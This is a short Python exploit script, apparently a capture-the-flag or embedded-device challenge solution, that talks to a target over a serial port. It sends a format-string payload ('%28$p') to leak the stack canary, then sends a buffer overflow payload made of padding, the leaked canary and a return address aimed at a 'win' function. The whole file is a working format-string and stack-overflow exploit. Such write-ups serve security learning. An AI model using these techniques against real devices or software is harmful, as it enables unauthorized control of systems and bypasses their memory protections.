#! /usr/bin/env python3
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2023 myasnik <myasnik@kitsune>
#
# Distributed under terms of the MIT license.

# FS: %28$p
# Win: 0x40080bd4 -> 0x80080bd4

from time import sleep
import serial
from pwn import *

def recv_and_print_all():
    while True:
        line = ser.readline()
        print(b"RCV >> " + line)
        if b"I'm a parrot" in line:
            print(b"RCV >> " + ser.read_until(b": "))
            break
        sleep(0.1)

ser = serial.Serial('/dev/ttyUSB1', 115200)

recv_and_print_all()
format_string = b"%28$p"
print("SND >> " + format_string.decode())
ser.write(format_string)
ser.readline()
tmp = ser.readline().decode()
print("RCV >> " + tmp)
canary = tmp.split(" ")[2]

print("DBG == Canary: " + canary + "\n")

canary = int(canary, 16)

recv_and_print_all()

#exp = b"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB" + pack(canary) + pack (0x8002a554) + pack(0x3ff9f820) + pack(0x60023) + pack(0x3) + pack(0x80080bd4)
exp = b"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB" + pack(canary) + b"AAAAAAAAAAAA" + pack(3) + pack(0x80080bd4)

print(b"SND >> " + exp)
ser.write(exp)

recv_and_print_all()
